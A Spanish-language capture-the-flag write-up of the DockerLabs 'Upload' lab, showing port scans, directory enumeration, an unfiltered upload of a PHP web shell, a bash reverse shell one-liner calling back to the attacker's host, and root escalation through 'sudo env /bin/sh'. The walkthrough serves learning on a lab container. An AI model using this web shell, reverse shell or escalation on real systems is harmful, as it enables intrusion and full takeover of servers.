---
title: DockerLabs - Upload
summary: "Write-up del laboratorio Upload de DockerLabs"
author: elcybercurioso
date: 2025-10-28 12:00
categories: [Post, DockerLabs]
tags: [fácil, arbitrary file upload, rce, sudo]
media_subpath: "/assets/img/posts/dockerlabs_upload"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Upload]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 00:42 GMT
Initiating ARP Ping Scan at 00:42
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 00:42, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:42
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 00:42, 10.25s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.000031s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.53 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65539 (2.622MB)
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Upload]
└─$ nmap -sCV -p80 172.17.0.2                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 00:42 GMT
Nmap scan report for consolelog.lab (172.17.0.2)
Host is up (0.000056s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Upload here your file
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds
```

## análisis

Comenzamos revisando lo que contiene la pagina principal del puerto 80 del laboratorio, donde nos permiten subir un fichero:

![Desktop View](/20251028014323.webp){: width="972" height="589" .shadow}

## explotación

Tratamos de subir un fichero `.php` que, al pasarle el parámetro `?cmd`, podemos indicar un comando, y si la configuración lo permite, se ejecutará:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Upload]
└─$ cat shell.php                                                                                           
<?php
        system($_GET['cmd']);
?>
```

Vemos que no hay ningún filtro que nos impida la subida:

![Desktop View](/20251028014545.webp){: width="972" height="589" .shadow}

Ahora buscamos recursos donde puede haber guardado la aplicación nuestro script:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Upload]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .txt,.html,.php
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/index.html           (Status: 200) [Size: 1361]
/upload.php           (Status: 200) [Size: 1357]
```

Lo encontramos en la carpeta `uploads`, y vemos que podemos ejecutar comando sin ningún problema:

![Desktop View](/20251028014749.webp){: width="972" height="589" .shadow}

Teniendo esto claro, obtenemos una consola en la máquina con un payload básico de `bash`:

![Desktop View](/20251028014958.webp){: width="972" height="589" .shadow}
```bash
bash -c 'bash -i >%26 /dev/tcp/172.17.0.1/4444 0>%261'
```

Habiéndonos puesto en escucha antes de ejecutar el comando en la web, ahora deberíamos haber obtenido la consola:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Upload]
└─$ nc -nlvp 4444 
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 46406
www-data@54d9841b83ec:/var/www/html/uploads$ whoami   
whoami
www-data
```

## escalada de privilegios

Revisamos los permisos SUDO del usuario `www-data`, y vemos que tiene asignado que puede ejecutar el binario `/usr/bin/env` como el usuario `root`:

```bash
www-data@54d9841b83ec:/var/www/html/uploads$ sudo -l
Matching Defaults entries for www-data on 54d9841b83ec:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on 54d9841b83ec:
    (root) NOPASSWD: /usr/bin/env
```

 En [GTFOBins](https://gtfobins.github.io/gtfobins/env/#sudo) nos indican que para obtener acceso como el usuario `root`, podemos hacerlo de la siguiente manera:

![Desktop View](/20251028015325.webp){: width="972" height="589" .shadow}

Ejecutamos el comando que nos indican, y vemos que nos hemos convertido en `root` en la máquina víctima:

```bash
www-data@54d9841b83ec:/var/www/html/uploads$ sudo env /bin/sh
# whoami
root
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>